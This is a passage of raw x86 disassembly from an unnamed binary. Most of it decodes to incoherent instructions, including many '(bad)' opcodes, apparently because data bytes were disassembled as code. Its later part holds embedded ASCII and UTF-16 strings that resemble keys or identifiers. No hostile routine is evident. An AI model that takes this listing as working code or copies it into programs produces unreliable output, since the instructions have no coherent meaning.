  42333a:	mov    dl,0xd8
  42333c:	das    
  42333d:	xlat   BYTE PTR ds:[ebx]
  42333e:	mov    ds:0xdf9df66,eax
  423343:	ret    
  423344:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423345:	push   ss
  423346:	push   esi
  423347:	out    dx,al
  423348:	(bad)  
  423349:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42334a:	and    al,0x5b
  42334c:	cli    
  42334d:	adc    dl,BYTE PTR [ebp+0x44]
  423350:	mov    BYTE PTR [esi],bl
  423352:	xor    bh,BYTE PTR [edi-0x61a348c8]
  423358:	ret    0x7cd2
  42335b:	mul    DWORD PTR [eax]
  42335d:	and    BYTE PTR [esp+eiz*2-0x54a8849f],dl
  423364:	lods   al,BYTE PTR ds:[esi]
  423365:	enter  0x3a57,0xab
  423369:	jp     0x423372
  42336b:	add    ch,dh
  42336d:	in     eax,dx
  42336e:	cli    
  42336f:	push   ss
  423370:	(bad)  
  423372:	shr    cl,1
	...
  423380:	add    BYTE PTR [eax],al
  423382:	outs   dx,BYTE PTR ds:[esi]
  423383:	jbe    0x423369
  423385:	retf   0xdafc
  423388:	outs   dx,BYTE PTR ds:[esi]
  423389:	neg    BYTE PTR [eax]
  42338b:	xchg   edx,eax
  42338c:	xchg   DWORD PTR [edi-0x56c4599f],edx
  423392:	std    
  423393:	fld    QWORD PTR [ecx]
  423395:	add    BYTE PTR [edx+0x0],bl
  423398:	add    BYTE PTR [eax],al
  42339a:	sti    
  42339b:	and    bh,cl
  42339d:	mov    al,0x28
  42339f:	cwde   
  4233a0:	mov    bh,0x3
  4233a2:	sti    
  4233a3:	mov    ecx,0x470c38ec
  4233a8:	adc    BYTE PTR [ecx-0x78892ac2],al
  4233ae:	add    DWORD PTR [ebp-0x19],ebp
  4233b1:	pop    ebx
  4233b2:	ins    BYTE PTR es:[edi],dx
  4233b3:	cs add dh,dh
  4233b6:	xor    ah,BYTE PTR [ebp-0x55f29068]
  4233bc:	leave  
  4233bd:	push   ss
  4233be:	inc    edi
  4233bf:	push   ds
  4233c0:	ins    DWORD PTR es:[edi],dx
  4233c1:	mov    edx,DWORD PTR [esi-0x70b767cd]
  4233c7:	pop    edi
  4233c8:	idiv   BYTE PTR [ebp-0x36eb7b6b]
  4233ce:	lahf   
  4233cf:	int    0xcd
  4233d1:	xor    eax,0x739c6292
  4233d6:	arpl   WORD PTR [esi],bx
  4233d8:	pop    eax
  4233d9:	mov    edi,0x73bfb159
  4233de:	pusha  
  4233df:	shr    BYTE PTR [ebx+0x4c621e3],cl
  4233e5:	test   edx,esi
  4233e7:	add    BYTE PTR [edi],0x61
  4233ea:	push   ds
  4233eb:	dec    edx
  4233ec:	inc    eax
  4233ed:	bnd jle 0x42337a
  4233f0:	cmovg  edx,DWORD PTR [edi]
  4233f3:	fild   WORD PTR [eax]
	...
  423401:	add    BYTE PTR [edx],bh
  423403:	push   edx
  423404:	les    ecx,FWORD PTR [edi]
  423406:	in     al,dx
  423407:	lahf   
  423408:	sti    
  423409:	ja     0x423401
  42340b:	rcl    DWORD PTR [eax-0x7e92d02d],1
  423411:	xchg   BYTE PTR [edi-0x22],dl
  423414:	add    DWORD PTR [eax],eax
  423416:	pop    edx
  423417:	add    BYTE PTR [eax],al
  423419:	add    BYTE PTR [esi],dl
  42341b:	pop    ebx
  42341c:	or     DWORD PTR [eax-0x7fda5128],ebp
  423422:	pop    eax
  423423:	sub    BYTE PTR [edx],dh
  423425:	push   0xd6e10c18
  42342a:	pop    edx
  42342b:	adc    al,BYTE PTR [ebx+ecx*1+0x53]
  42342f:	and    cl,bh
  423431:	cmp    edi,DWORD PTR [ebx+0x43]
  423434:	out    0xdd,al
  423436:	adc    al,0x40
  423438:	ret    0xe6db
  42343b:	add    BYTE PTR [edx+0x3c],dh
  42343e:	pop    ds
  42343f:	cmp    DWORD PTR [ebx-0x44],ebx
  423442:	xor    al,0x6a
  423444:	push   ss
  423445:	pop    esi
  423446:	popf   
  423447:	mov    ebp,0xfbee6970
  42344c:	pushf  
  42344d:	push   edx
  42344e:	mov    ah,0x16
  423450:	jne    0x42347f
  423452:	test   eax,0x5f39620d
  423457:	cdq    
  423458:	push   edx
  423459:	popf   
  42345a:	ja     0x4234c7
  42345c:	jge    0x42347a
  42345e:	jno    0x42347f
  423460:	jmp    esi
  423462:	gs add eax,0x9e3cb3d
  423468:	and    cl,BYTE PTR [ecx-0x9]
  42346b:	data16 loopne 0x423466
  42346e:	sub    al,0xcd
  423470:	mov    ecx,0xcbdc6d
	...
  423481:	add    BYTE PTR [ebx-0x4293427d],dl
  423487:	jle    0x42345c
  423489:	call   DWORD PTR [eax-0x20]
  42348c:	cli    
  42348d:	call   0xdeb1:0x589f8f09
  423494:	add    DWORD PTR [eax],eax
  423496:	pop    edx
  423497:	add    BYTE PTR [eax],al
  423499:	add    ch,bl
  42349b:	or     eax,0x4370bb6
  4234a0:	push   edx
  4234a1:	unpcklps xmm7,XMMWORD PTR [ecx-0x19]
  4234a5:	dec    esi
  4234a6:	and    ecx,ebx
  4234a8:	mov    ds:0xdd4c1f80,eax
  4234ad:	loope  0x4234df
  4234af:	add    bh,BYTE PTR [esi]
  4234b1:	sbb    DWORD PTR [edi],edi
  4234b3:	fist   DWORD PTR [edi-0x2f]
  4234b6:	or     eax,0xb2c492e2
  4234bb:	fsubr  QWORD PTR ds:[ebp+0x39bb70ae]
  4234c2:	psubusw mm0,mm1
  4234c5:	shr    bh,cl
  4234c7:	shl    bh,cl
  4234c9:	xchg   edi,eax
  4234ca:	pop    ss
  4234cb:	push   0x3a379030
  4234d0:	push   esp
  4234d1:	int3   
  4234d2:	retf   
  4234d3:	popa   
  4234d4:	jbe    0x423536
  4234d6:	clc    
  4234d7:	pop    edi
  4234d8:	pop    ebp
  4234d9:	inc    esi
  4234da:	bound  edx,QWORD PTR [ebx-0x213f6500]
  4234e0:	and    DWORD PTR [esi+0x11],edx
  4234e3:	ja     0x423535
  4234e5:	pop    ss
  4234e6:	pop    ds
  4234e7:	lods   eax,DWORD PTR ds:[esi]
  4234e8:	out    dx,al
  4234e9:	xchg   ebp,eax
  4234ea:	adc    eax,0x5d05c9ec
  4234ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234f0:	cmp    DWORD PTR [esi+0x3f],ebp
  4234f3:	jle    0x4234f5
	...
  423501:	add    ah,bl
  423503:	fincstp 
  423505:	shl    bh,0xee
  423508:	(bad)  
  423509:	frstor [ecx+eax*1]
  42350c:	pop    ebp
  42350d:	dec    edi
  42350e:	jns    0x42356e
  423510:	or     al,0x7f
  423512:	or     ebx,edi
  423514:	add    DWORD PTR [eax],eax
  423516:	pop    edx
  423517:	add    BYTE PTR [eax],al
  423519:	add    BYTE PTR [ebx+ebx*2],bl
  42351c:	sbb    ah,BYTE PTR [ecx]
  42351e:	pop    eax
  42351f:	inc    ebx
  423520:	popf   
  423521:	adc    eax,0x1cfe2d28
  423526:	inc    edi
  423527:	mov    esp,esi
  423529:	stos   DWORD PTR es:[edi],eax
  42352a:	push   ds
  42352b:	ins    DWORD PTR es:[edi],dx
  42352c:	push   edx
  42352d:	adc    BYTE PTR [ebp-0x7b],bl
  423530:	daa    
  423531:	loope  0x4234bd
  423533:	inc    esp
  423534:	adc    eax,0x1e4aee27
  423539:	aas    
  42353a:	scas   al,BYTE PTR es:[edi]
  42353b:	loopne 0x423569
  42353d:	scas   eax,DWORD PTR es:[edi]
  42353e:	xchg   DWORD PTR [ecx+0x2978eaa1],ebx
  423544:	dec    esi
  423545:	in     al,dx
  423546:	jnp    0x4235a5
  423548:	mov    DWORD PTR [esi-0x27adc78c],ebp
  42354e:	dec    esi
  42354f:	mov    edx,ss
  423551:	adc    eax,0xa31a4e91
  423556:	xchg   esp,eax
  423557:	out    0x7,eax
  423559:	aad    0x18
  42355b:	pop    es
  42355c:	fs pushf 
  42355e:	repnz cmp dh,bh
  423561:	addr16 ja 0x423510
  423564:	sbb    al,0xbc
  423566:	dec    esp
  423567:	xchg   edi,eax
  423568:	xchg   ebp,eax
  423569:	mov    bh,0x47
  42356b:	ss sbb al,0xbe
  42356e:	jmp    0x36:0xd0e349bc
	...
  423581:	add    BYTE PTR [edi-0x5e],ch
  423584:	aam    0x2a
  423586:	fnstsw WORD PTR [esi-0x1]
  423589:	out    0x52,eax
  42358b:	fcmovu st,st(5)
  42358d:	in     eax,0x66
  42358f:	cmp    edx,ebp
  423591:	adc    esp,DWORD PTR [ebp-0x21]
  423594:	add    DWORD PTR [eax],eax
  423596:	pop    edx
  423597:	add    BYTE PTR [eax],al
  423599:	add    BYTE PTR [esi],bl
  42359b:	test   esp,edx
  42359d:	cmp    ah,BYTE PTR [ecx]
  42359f:	xchg   BYTE PTR [edi+ecx*4],ah
  4235a2:	mov    ds:0x7ed0aa75,al
  4235a7:	jmp    FWORD PTR [ecx]
  4235a9:	mov    BYTE PTR [edx-0x1f],ch
  4235ac:	nop
  4235ad:	inc    ebx
  4235ae:	out    0x87,al
  4235b0:	and    al,0x47
  4235b2:	xchg   edx,eax
  4235b3:	xchg   edx,eax
  4235b4:	(bad)  
  4235b5:	jmp    0x423556
  4235b7:	dec    eax
  4235b8:	xchg   edi,eax
  4235b9:	mov    ah,0xab
  4235bb:	(bad)  
  4235bc:	in     al,dx
  4235bd:	add    cl,BYTE PTR [edx+0x261aca25]
  4235c3:	sbb    eax,0xa0ef6f75
  4235c8:	repz cmp BYTE PTR [edi-0x3080a8f4],0x9d
  4235d0:	in     al,0xe9
  4235d2:	loop   0x4235d0
  4235d4:	sub    dh,BYTE PTR [ebp-0x553c06f2]
  4235da:	dec    ecx
  4235db:	mov    bl,BYTE PTR [esi]
  4235dd:	mov    eax,0x13229d79
  4235e2:	xchg   edi,eax
  4235e3:	scas   ax,WORD PTR es:[edi]
  4235e5:	sbb    DWORD PTR [edx-0x565e6837],ebx
  4235eb:	xor    DWORD PTR [edi],0xffffffc7
  4235ee:	gs add eax,0xde8cbb36
	...
  423600:	add    BYTE PTR [eax],al
  423602:	stc    
  423603:	sbb    al,al
  423605:	inc    esi
  423606:	jecxz  0x4235e6
  423608:	(bad)  
  423609:	mov    edi,0xe1f1bc83
  42360e:	mov    ebp,DWORD PTR [ecx-0x20400474]
  423614:	add    DWORD PTR [eax],eax
  423616:	pop    edx
  423617:	add    BYTE PTR [eax],al
  423619:	add    BYTE PTR [ecx-0x5d],bh
  42361c:	inc    edx
  42361d:	mov    eax,0xec6d52d0
  423622:	mov    esp,ebp
  423624:	sub    ebp,edx
  423626:	ins    DWORD PTR es:[edi],dx
  423627:	stc    
  423628:	hlt    
  423629:	ret    
  42362a:	mov    edx,0xcf7e3117
  42362f:	stos   BYTE PTR es:[edi],al
  423630:	scas   eax,DWORD PTR es:[edi]
  423631:	push   edx
  423632:	cwde   
  423633:	lods   al,BYTE PTR ds:[esi]
  423634:	cld    
  423635:	push   eax
  423636:	inc    ebx
  423637:	sub    eax,0x84400f47
  42363c:	aaa    
  42363d:	in     eax,0x51
  42363f:	add    edx,edx
  423641:	es dec edx
  423643:	mov    WORD PTR [ebx],es
  423645:	in     al,dx
  423646:	lock push ds
  423648:	mov    al,ds:0x2cb8928d
  42364d:	icebp  
  42364e:	inc    esp
  42364f:	les    edi,FWORD PTR [edi]
  423651:	push   ss
  423652:	aaa    
  423653:	(bad)  
  423654:	mov    cl,0x3b
  423656:	or     bl,BYTE PTR [edx]
  423658:	dec    esi
  423659:	ror    BYTE PTR [edi],0xf4
  42365c:	pop    edi
  42365d:	mov    al,ds:0xef97ff5d
  423662:	mov    es,WORD PTR [eax+ebp*4+0x464f0cf1]
  423669:	ss jmp 0xf203687c
  42366f:	rol    ecx,cl
  423671:	dec    edx
  423672:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423673:	dec    esp
	...
  423680:	add    BYTE PTR [eax],al
  423682:	mov    eax,ds:0x3e8336b9
  423687:	(bad)  
  423688:	mov    ch,0xbb
  42368a:	icebp  
  42368b:	and    eax,0x41238c27
  423690:	call   0x2225006
  423695:	add    BYTE PTR [edx+0x0],bl
  423698:	add    BYTE PTR [eax],al
  42369a:	jne    0x4236a5
  42369c:	mov    al,ds:0xeb8d6a57
  4236a1:	je     0x4236fa
  4236a3:	cmp    bl,BYTE PTR [esi-0x3bd724a0]
  4236a9:	xor    BYTE PTR [ebp+0x4e3e4c54],bh
  4236af:	mov    eax,0x60b89d3a
  4236b4:	mov    DWORD PTR [ebx-0x18],0x77e4d812
  4236bb:	jns    0x42368f
  4236bd:	jmp    0xce38:0x90b17768
  4236c4:	scas   eax,DWORD PTR es:[edi]
  4236c5:	mov    al,BYTE PTR [ecx-0x7]
  4236c8:	xor    eax,0x6915734b
  4236cd:	lds    esi,FWORD PTR [eax]
  4236cf:	lods   eax,DWORD PTR ds:[esi]
  4236d0:	dec    edx
  4236d1:	imul   esi,DWORD PTR [eax+ecx*4+0x10],0x5d
  4236d6:	cld    
  4236d7:	pusha  
  4236d8:	ret    0xd401
  4236db:	inc    edx
  4236dc:	imul   ecx,DWORD PTR [ecx],0x54
  4236df:	mov    dh,BYTE PTR [edx]
  4236e1:	cld    
  4236e2:	jb     0x423727
  4236e4:	adc    BYTE PTR [esi],al
  4236e6:	arpl   bx,sp
  4236e8:	jmp    0xa039:0xb909ae01
  4236ef:	mov    ah,0x6
  4236f1:	mov    cl,0x54
  4236f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  423700:	add    BYTE PTR [eax],al
  423702:	adc    dl,bh
  423704:	repz or esi,edi
  423707:	das    
  423708:	cli    
  423709:	fist   WORD PTR [ecx]
  42370b:	dec    ebx
  42370c:	es nop
  42370e:	aad    0x46
  423710:	push   ecx
  423711:	shl    DWORD PTR [ebx-0x20],cl
  423714:	add    DWORD PTR [eax],eax
  423716:	pop    edx
  423717:	add    BYTE PTR [eax],al
  423719:	add    BYTE PTR [edx-0x1f],dl
  42371c:	(bad)  
  42371d:	test   BYTE PTR [esi+ecx*4-0x80],0xab
  423722:	icebp  
  423723:	pop    ds
  423724:	xchg   BYTE PTR [esp+edx*1-0x77],cl
  423728:	test   al,0x5a
  42372a:	sbb    BYTE PTR [ecx+ebp*2-0x2e],0xbf
  42372f:	fcmovnu st,st(0)
  423731:	stc    
  423732:	xor    eax,0xd7e85da2
  423737:	lahf   
  423738:	ror    BYTE PTR [edi-0x7b],cl
  42373b:	and    eax,0xae2eed97
  423740:	sub    ah,BYTE PTR [ebx]
  423742:	in     eax,0x8f
  423744:	jmp    DWORD PTR [eax+0x3d]
  423747:	fwait
  423748:	push   0xa7cca0d7
  42374d:	dec    esp
  42374e:	sti    
  42374f:	imul   ecx,DWORD PTR [ecx+0x7ca13fb1],0x72
  423756:	jo     0x42375d
  423758:	aas    
  423759:	ret    
  42375a:	xchg   ebp,eax
  42375b:	mov    eax,ds:0x6e7802be
  423760:	ja     0x4237dc
  423762:	int    0x7c
  423764:	jge    0x423726
  423766:	mov    ss,WORD PTR [ebp-0x23]
  423769:	lea    ecx,[ecx+ebp*8+0x18d4728d]
  423770:	ins    DWORD PTR es:[edi],dx
  423771:	popa   
  423772:	pop    ds
  423773:	dec    esp
	...
  423780:	add    BYTE PTR [eax],al
  423782:	adc    bh,BYTE PTR [edx-0x19073928]
  423788:	push   ds
  423789:	(bad)  
  42378a:	adc    bl,dh
  42378c:	cwde   
  42378d:	out    dx,al
  42378e:	data16 in al,dx
  423790:	fwait
  423791:	repnz int 0xe0
  423794:	add    DWORD PTR [eax],eax
  423796:	pop    edx
  423797:	add    BYTE PTR [eax],al
  423799:	add    BYTE PTR [esi+0x27],dl
  42379c:	popf   
  42379d:	enter  0x94e8,0xe4
  4237a1:	les    ebp,FWORD PTR ds:0x6cd30bc3
  4237a7:	mov    edx,0xf8813fa1
  4237ac:	pop    ss
  4237ad:	(bad)  
  4237af:	adc    ebx,DWORD PTR [edi]
  4237b1:	push   ebp
  4237b2:	inc    edx
  4237b3:	inc    esp
  4237b4:	and    ch,cl
  4237b6:	fld    TBYTE PTR ds:0x735efc26
  4237bc:	or     eax,0x15f96005
  4237c1:	fisubr DWORD PTR [eax]
  4237c3:	sahf   
  4237c4:	fcmove st,st(2)
  4237c6:	add    DWORD PTR [ebx+0x6c],esp
  4237c9:	add    BYTE PTR cs:[edx],0x71
  4237cd:	ret    0xaf26
  4237d0:	mov    esi,0xa7b3501e
  4237d5:	and    BYTE PTR [ecx+esi*8-0x3a3224c7],ch
  4237dc:	sbb    eax,esi
  4237de:	shrd   DWORD PTR [esi],ecx,cl
  4237e1:	aam    0x7d
  4237e3:	cs inc BYTE PTR ds:[edi-0x2a]
  4237e8:	loop   0x4237c7
  4237ea:	sub    ch,BYTE PTR [esi-0x40]
  4237ed:	(bad)  
  4237ee:	jbe    0x423832
  4237f0:	mov    cl,0x50
  4237f2:	push   ecx
  4237f3:	add    BYTE PTR [eax],0x0
	...
  423802:	add    al,al
  423804:	inc    edx
  423805:	add    BYTE PTR [eax+eax*8],al
  423808:	inc    edx
  423809:	add    BYTE PTR [eax],cl
  42380b:	rol    BYTE PTR [edx+0x0],0xc
  42380f:	rol    BYTE PTR [edx+0x0],0x10
  423813:	rol    BYTE PTR [edx+0x0],0x14
  423817:	rol    BYTE PTR [edx+0x0],0x18
  42381b:	rol    BYTE PTR [edx+0x0],0x1c
  42381f:	rol    BYTE PTR [edx+0x0],0x57
  423823:	inc    edi
  423824:	cmp    DWORD PTR [edi+0x41],ebx
  423827:	pop    eax
  423828:	ss push esi
  42382a:	pop    edi
  42382b:	cmp    BYTE PTR [eax],al
  42382d:	inc    ebx
  42382e:	inc    ebp
  42382f:	dec    esp
  423830:	pop    edi
  423831:	pop    eax
  423832:	push   edi
  423833:	dec    eax
  423834:	inc    edx
  423835:	add    BYTE PTR [edi+0x50],dl
  423838:	xor    eax,0x4641365f
  42383d:	cmp    DWORD PTR [edx],esi
  42383f:	xor    ebx,DWORD PTR [edi+0x32]
  423842:	aaa    
  423843:	add    BYTE PTR [eax+0x48],dl
  423846:	xor    BYTE PTR [edi+0x58],bl
  423849:	push   esp
  42384a:	inc    ecx
  42384b:	dec    ebp
  42384c:	push   ecx
  42384d:	pop    edi
  42384e:	inc    esi
  42384f:	push   ebp
  423850:	cmp    DWORD PTR [eax],eax
  423852:	push   edi
  423853:	push   ebp
  423854:	inc    ecx
  423855:	xor    dh,BYTE PTR [ebx]
  423857:	xor    ebx,DWORD PTR [edi+0x4e]
  42385a:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  42385e:	cmp    DWORD PTR [edi+0x38],ebx
  423861:	dec    ecx
  423862:	cmp    DWORD PTR [edx+0x36],ebx
  423865:	pop    edi
  423866:	dec    edx
  423867:	xor    BYTE PTR [edx+0x34],cl
  42386a:	add    BYTE PTR [ecx+eax*2+0x34],cl
  42386e:	xor    esi,DWORD PTR [eax]
  423870:	pop    edi
  423871:	inc    edx
  423872:	dec    ebx
  423873:	pop    eax
  423874:	pop    eax
  423875:	xor    eax,0x51414d00
  42387a:	pop    edi
  42387b:	inc    ecx
  42387c:	xor    al,BYTE PTR [ebp+0x5f]
  42387f:	inc    ecx
  423880:	dec    ebx
  423881:	cmp    DWORD PTR ds:0x5a003939,esi
  423887:	inc    ebp
  423888:	cmp    BYTE PTR [edi+0x4d],bl
  42388b:	ss dec eax
  42388d:	dec    ebx
  42388e:	add    BYTE PTR [ebp+0x57],al
  423891:	xor    DWORD PTR [edi+0x31],ebx
  423894:	dec    ebx
  423895:	xor    eax,DWORD PTR [ecx+0x30]
  423898:	push   ebx
  423899:	add    BYTE PTR [edx+esi*1+0x36],al
  42389d:	aaa    
  42389e:	pop    edi
  42389f:	push   edx
  4238a0:	dec    eax
  4238a1:	dec    ebp
  4238a2:	cmp    BYTE PTR [edi+0x37],bl
  4238a5:	inc    esi
  4238a6:	xor    eax,0x43355500
  4238ab:	pop    edi
  4238ac:	pop    ecx
  4238ad:	dec    ecx
  4238ae:	push   ebx
  4238af:	xor    bl,BYTE PTR [edi+0x52]
  4238b2:	add    BYTE PTR [eax+0x55],dl
  4238b5:	dec    ecx
  4238b6:	xor    BYTE PTR [edi+0x43],bl
  4238b9:	ss inc ebp
  4238bb:	xor    bl,BYTE PTR [edi+0x4d]
  4238be:	xor    al,0x4a
  4238c0:	push   edx
  4238c1:	push   ebp
  4238c2:	add    BYTE PTR [esi+0x39],cl
  4238c5:	push   eax
  4238c6:	pop    edi
  4238c7:	push   ebp
  4238c8:	cmp    DWORD PTR [esi],esi
  4238ca:	xor    BYTE PTR [ecx],dh
  4238cc:	pop    edi
  4238cd:	dec    edi
  4238ce:	dec    esi
  4238cf:	push   esp
  4238d0:	cmp    BYTE PTR [eax],al
  4238d2:	dec    esp
  4238d3:	xor    al,0x44
  4238d5:	xor    DWORD PTR [edi+0x4b],ebx
  4238d8:	xor    DWORD PTR [ebp+0x5f],eax
  4238db:	pop    edx
  4238dc:	add    BYTE PTR [edi+esi*1+0x43],dl
  4238e0:	pop    edi
  4238e1:	inc    edx
  4238e2:	xor    dh,BYTE PTR [ecx]
  4238e4:	push   ebx
  4238e5:	xor    DWORD PTR [ecx],edi
  4238e7:	inc    edx
  4238e8:	add    BYTE PTR [edi+0x45],al
  4238eb:	xor    al,0x38
  4238ed:	xor    BYTE PTR [eax],dh
  4238ef:	pop    edi
  4238f0:	dec    edx
  4238f1:	dec    ebx
  4238f2:	xor    eax,0x33345f4d
  4238f7:	add    BYTE PTR [ebx+esi*1+0x57],cl
  4238fb:	pop    edi
  4238fc:	aaa    
  4238fd:	push   esi
  4238fe:	dec    ebx
  4238ff:	push   edx
  423900:	pop    edi
  423901:	inc    ebx
  423902:	add    BYTE PTR [edx+0x35],bl
  423905:	dec    ebp
  423906:	pop    edi
  423907:	inc    edi
  423908:	dec    esi
  423909:	xor    al,0x49
  42390b:	xor    eax,0x54590035
  423910:	push   edx
  423911:	pop    edi
  423912:	push   esp
  423913:	inc    ebx
  423914:	inc    ecx
  423915:	pop    edi
  423916:	cmp    DWORD PTR [ecx+0x41],ebx
  423919:	push   ebp
  42391a:	pop    edi
  42391b:	push   ebp
  42391c:	inc    ebp
  42391d:	add    BYTE PTR [esi+esi*1+0x35],cl
  423921:	pop    edi
  423922:	pop    eax
  423923:	dec    edx
  423924:	inc    edx
  423925:	inc    edi
  423926:	add    BYTE PTR [edx+0x36],al
  423929:	inc    ebx
  42392a:	pop    edi
  42392b:	xor    BYTE PTR ds:0x36464b,dh
  423931:	dec    ebx
  423932:	cmp    DWORD PTR [esi+0x37],eax
  423935:	xor    ebx,DWORD PTR [edi+0x35]
  423938:	ss inc edi
  42393a:	pop    ecx
  42393b:	dec    eax
  42393c:	pop    ecx
  42393d:	add    BYTE PTR [ebp+0x35],cl
  423940:	push   eax
  423941:	xor    BYTE PTR [edi+0x4f],bl
  423944:	pop    ecx
  423945:	xor    cl,BYTE PTR [edi+0x0]
  423948:	pop    ecx
  423949:	xor    DWORD PTR [esi+0x5f],ecx
  42394c:	xor    al,BYTE PTR [edx+0x30]
  42394f:	push   esi
  423950:	push   esp
  423951:	inc    ebp
  423952:	add    BYTE PTR [edi+0x37],al
  423955:	push   esi
  423956:	xor    DWORD PTR [edi+0x49],ebx
  423959:	xor    al,BYTE PTR [esi+0x30]
  42395c:	pop    edi
  42395d:	ss dec esi
  42395f:	cmp    BYTE PTR [eax],al
  423961:	pop    edx
  423962:	xor    eax,0x445f334b
  423967:	xor    BYTE PTR [eax],bh
  423969:	push   ecx
  42396a:	push   esi
  42396b:	xor    al,0x0
  42396d:	push   ebp
  42396e:	pop    eax
  42396f:	inc    edi
  423970:	xor    DWORD PTR [edi+0x39],ebx
  423973:	push   esp
  423974:	inc    ebx
  423975:	aaa    
  423976:	inc    esp
  423977:	add    BYTE PTR [edi+0x39],dl
  42397a:	ss pop edi
  42397c:	dec    eax
  42397d:	pop    edx
  42397e:	pop    ecx
  42397f:	inc    edi
  423980:	push   ebp
  423981:	pop    edi
  423982:	push   eax
  423983:	dec    eax
  423984:	inc    ebx
  423985:	add    BYTE PTR [ebp+0x0],dl
  423988:	xor    al,0x0
  42398a:	dec    edi
  42398b:	add    BYTE PTR [edi+0x0],bl
  42398e:	cmp    BYTE PTR [eax],al
  423990:	xor    al,BYTE PTR [eax]
  423992:	inc    ebx
  423993:	add    BYTE PTR [edx+0x0],bl
  423996:	inc    ebx
  423997:	add    BYTE PTR [edi],dh
  423999:	add    BYTE PTR [edi+0x0],bl
  42399c:	inc    ebx
  42399d:	add    BYTE PTR [eax+eax*1+0x0],al
  4239a1:	add    BYTE PTR [eax+eax*1+0x4b],cl
  4239a5:	add    BYTE PTR [edx],dh
  4239a7:	add    BYTE PTR [edi+0x0],bl
  4239aa:	cmp    BYTE PTR [eax],al
  4239ac:	dec    esp
  4239ad:	add    BYTE PTR [esi+0x0],dl
  4239b0:	pop    edi
  4239b1:	add    BYTE PTR [ecx+0x0],bl
  4239b4:	push   edx
  4239b5:	add    BYTE PTR [esi+0x0],dl
  4239b8:	xor    al,BYTE PTR [eax]
  4239ba:	cmp    BYTE PTR [eax],al
  4239bc:	pop    edi
  4239bd:	add    BYTE PTR [edx+0x0],cl
  4239c0:	add    BYTE PTR [eax],al
  4239c2:	inc    edx
  4239c3:	add    BYTE PTR [eax+eax*1+0x46],cl
  4239c7:	add    BYTE PTR [edi+0x0],bl
  4239ca:	xor    eax,DWORD PTR [eax]
  4239cc:	inc    ebp
  4239cd:	add    BYTE PTR [ecx+0x0],cl
  4239d0:	push   edx
  4239d1:	add    BYTE PTR [ecx],bh
  4239d3:	add    BYTE PTR [esi+0x0],dl
  4239d6:	add    BYTE PTR [eax],al
  4239d8:	dec    ebp
  4239d9:	add    BYTE PTR [edi],dh
  4239db:	add    BYTE PTR [eax+eax*1+0x5f],al
  4239df:	add    BYTE PTR [edx+0x0],cl
  4239e2:	pop    eax
  4239e3:	add    BYTE PTR [ebx],dh
  4239e5:	add    BYTE PTR [ecx],dh
  4239e7:	add    BYTE PTR [ebx+0x0],al
  4239ea:	add    BYTE PTR [eax],al
  4239ec:	dec    edi
  4239ed:	add    BYTE PTR [esi],dh
  4239ef:	add    BYTE PTR [eax+0x0],cl
  4239f2:	pop    edi
  4239f3:	add    BYTE PTR [eax],dh
  4239f5:	add    BYTE PTR [edi],dh
  4239f7:	add    BYTE PTR [ecx],dh
  4239f9:	add    BYTE PTR [edx+0x0],dl
  4239fc:	xor    eax,0x55000000
  423a01:	add    BYTE PTR [eax+eax*1+0x5a],dl
  423a05:	add    BYTE PTR [edi+0x0],bl
  423a08:	push   esp
  423a09:	add    BYTE PTR [ecx+0x0],al
  423a0c:	cmp    DWORD PTR [eax],eax
  423a0e:	pop    edi
  423a0f:	add    BYTE PTR [ebx],dh
  423a11:	add    BYTE PTR [eax],dh
  423a13:	add    BYTE PTR [eax],bh
  423a15:	add    BYTE PTR [edi+0x0],cl
  423a18:	inc    ebx
  423a19:	add    BYTE PTR ds:0x4d000000,dh
  423a1f:	add    BYTE PTR [esi+0x0],cl
  423a22:	inc    ebp
  423a23:	add    BYTE PTR [edi+0x0],bl
  423a26:	push   esp
  423a27:	add    BYTE PTR [esi+0x0],al
  423a2a:	cmp    BYTE PTR [eax],al
  423a2c:	push   ebx
  423a2d:	add    BYTE PTR [edx+0x0],bl
  423a30:	pop    edi
  423a31:	add    BYTE PTR [eax],dh
  423a33:	add    BYTE PTR [eax],bh
  423a35:	add    BYTE PTR [eax+0x0],cl
  423a38:	add    BYTE PTR [eax],al
  423a3a:	dec    esi
  423a3b:	add    BYTE PTR [edi+0x0],cl
  423a3e:	pop    edx
  423a3f:	add    BYTE PTR [edi+0x0],bl
  423a42:	add    BYTE PTR ss:[ecx+0x0],bl
  423a46:	dec    ebp
  423a47:	add    BYTE PTR [esi],dh
  423a49:	add    BYTE PTR [ebx],dh
  423a4b:	add    BYTE PTR [edi+0x0],bl
  423a4e:	xor    al,0x0
  423a50:	dec    esi
  423a51:	add    BYTE PTR [edx],dh
  423a53:	add    BYTE PTR [esi],dh
  423a55:	add    BYTE PTR [ecx],dh
  423a57:	add    BYTE PTR [eax],al
  423a59:	add    BYTE PTR [ebx+0x0],cl
  423a5c:	dec    eax
  423a5d:	add    BYTE PTR [eax],bh
  423a5f:	add    BYTE PTR [edi+0x0],bl
  423a62:	inc    esi
  423a63:	add    BYTE PTR [esi+0x0],al
  423a66:	push   esp
  423a67:	add    BYTE PTR [edi],dh
  423a69:	add    BYTE PTR [esi],dh
  423a6b:	add    BYTE PTR [edi+0x0],bl
  423a6e:	dec    esp
  423a6f:	add    BYTE PTR [ecx+0x0],bl
  423a72:	add    BYTE PTR [eax],al
  423a74:	push   ebx
  423a75:	add    BYTE PTR [ecx+0x0],bl
  423a78:	xor    BYTE PTR [eax],al
  423a7a:	pop    edi
  423a7b:	add    BYTE PTR [ecx],bh
  423a7d:	add    BYTE PTR [edx+0x0],dl
  423a80:	dec    eax
  423a81:	add    BYTE PTR [ecx+0x0],bl
  423a84:	xor    al,BYTE PTR [eax]
  423a86:	pop    edi
  423a87:	add    BYTE PTR [eax],dh
  423a89:	add    BYTE PTR [eax],al
  423a8b:	add    BYTE PTR [edx+0x0],al
  423a8e:	dec    edx
  423a8f:	add    BYTE PTR [esi+0x0],cl
  423a92:	xor    al,BYTE PTR [eax]
  423a94:	pop    edi
  423a95:	add    BYTE PTR [eax+eax*1+0x33],cl
  423a99:	add    BYTE PTR [edx+0x0],dl
  423a9c:	xor    al,0x0
  423a9e:	dec    eax
  423a9f:	add    BYTE PTR [eax],al
  423aa1:	add    BYTE PTR [ebp+0x0],dl
  423aa4:	add    BYTE PTR ss:[ebp+0x0],cl
